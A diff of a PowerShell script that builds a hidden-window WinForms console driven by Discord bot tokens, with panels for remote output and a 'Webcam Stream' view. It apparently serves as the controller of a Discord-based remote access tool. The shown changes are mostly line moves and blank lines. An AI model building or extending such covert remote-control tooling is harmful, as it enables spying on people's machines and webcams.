@@ -1,13 +1,12 @@
+﻿Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+[System.Windows.Forms.Application]::EnableVisualStyles()
 
 # Variables for token and channel IDs
 $token = 'TOKEN_1_HERE' # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
 $token2 = 'TOKEN_2_HERE' # BOT TO SEND MESSAGES AS USER
 
 # ============================ SCRIPT SETUP =============================
-﻿Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-[System.Windows.Forms.Application]::EnableVisualStyles()
-
 $hidewindow = 1
 If ($HideWindow -gt 0){
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
@@ -65,9 +64,11 @@ function Get-DiscordChannelIDs {
         }
     }
 }
+
 Get-DiscordChannelIDs -Token $token 
 
 # ============================ GUI SETUP =============================
+
 $imageUrl = "https://i.imgur.com/RJSsYC7.png"
 $client = New-Object System.Net.WebClient
 $imageBytes = $client.DownloadData($imageUrl)
@@ -94,6 +95,7 @@ $TextBoxHeader.Width = 25
 $TextBoxHeader.Height = 10
 $TextBoxHeader.Location = New-Object System.Drawing.Point(10, 840)
 $form.Controls.Add($TextBoxHeader)
+
 $TextBoxInput = New-Object System.Windows.Forms.TextBox
 $TextBoxInput.Location = New-Object System.Drawing.Point(10, 860)
 $TextBoxInput.BackColor = "#eeeeee"
@@ -112,6 +114,7 @@ $TextBox2Header.Width = 25
 $TextBox2Header.Height = 10
 $TextBox2Header.Location = New-Object System.Drawing.Point(620, 840)
 $form.Controls.Add($TextBox2Header)
+
 $TextBox2Input = New-Object System.Windows.Forms.TextBox
 $TextBox2Input.Location = New-Object System.Drawing.Point(620, 860)
 $TextBox2Input.BackColor = "#eeeeee"
@@ -210,6 +213,7 @@ $OutputBoxHeader.Width = 25
 $OutputBoxHeader.Height = 10
 $OutputBoxHeader.Location = New-Object System.Drawing.Point(10, 460)
 $form.Controls.Add($OutputBoxHeader)
+
 $OutputBox = New-Object System.Windows.Forms.RichTextBox 
 $OutputBox.Multiline = $True
 $OutputBox.Location = New-Object System.Drawing.Size(10,480) 
@@ -229,6 +233,7 @@ $OutputBoxHeader2.Width = 25
 $OutputBoxHeader2.Height = 10
 $OutputBoxHeader2.Location = New-Object System.Drawing.Point(620, 460)
 $form.Controls.Add($OutputBoxHeader2)
+
 $OutputBox2 = New-Object System.Windows.Forms.RichTextBox
 $OutputBox2.Multiline = $True
 $OutputBox2.Location = New-Object System.Drawing.Size(620,480) 
@@ -248,6 +253,7 @@ $OutputBoxHeader3.Width = 25
 $OutputBoxHeader3.Height = 10
 $OutputBoxHeader3.Location = New-Object System.Drawing.Point(620, 650)
 $form.Controls.Add($OutputBoxHeader3)
+
 $OutputBox3 = New-Object System.Windows.Forms.RichTextBox
 $OutputBox3.Multiline = $True
 $OutputBox3.Location = New-Object System.Drawing.Size(620,670) 
@@ -267,6 +273,7 @@ $pictureBox1Header.Width = 25
 $pictureBox1Header.Height = 10
 $pictureBox1Header.Location = New-Object System.Drawing.Point(10, 30)
 $form.Controls.Add($pictureBox1Header)
+
 $pictureBox2Header = New-Object System.Windows.Forms.Label
 $pictureBox2Header.Text = "Webcam Stream"
 $pictureBox2Header.AutoSize = $true
@@ -288,6 +295,7 @@ function Create-ImageForm {
     $pictureBox1.Left = 10
     $pictureBox1.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
     $pictureBox1.ImageLocation = $imagePath1
+
     $pictureBox2 = New-Object System.Windows.Forms.PictureBox
     $pictureBox2.Width = 600
     $pictureBox2.Height = 400
@@ -295,6 +303,7 @@ function Create-ImageForm {
     $pictureBox2.Left = 620
     $pictureBox2.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
     $pictureBox2.ImageLocation = $imagePath2
+
     $form.Controls.Add($pictureBox1)
     $form.Controls.Add($pictureBox2)
     return $form, $pictureBox1, $pictureBox2
